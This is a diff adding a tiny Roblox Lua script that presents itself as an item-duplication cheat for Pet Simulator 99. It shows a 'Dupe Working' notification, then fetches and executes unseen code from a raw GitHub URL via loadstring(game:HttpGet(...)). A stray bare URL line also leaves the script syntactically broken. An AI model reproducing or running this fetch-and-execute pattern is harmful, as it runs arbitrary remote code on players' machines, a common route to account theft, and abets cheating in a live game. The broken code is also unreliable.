@@ -1,0 +1,9 @@
+wait(0.5)
+game.StarterGui:SetCore("SendNotification", {
+Title = "Dupe Working"; -- the title 
+Text = "Loading..."; -- what the text says 
+Duration = 5; -- how long the notification should in secounds
+})
+
+https://raw.githubusercontent.com/Sensui0011/PS99DUPE/main/PS99
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sensui0011/PS99DUPE/main/PS99", true))()
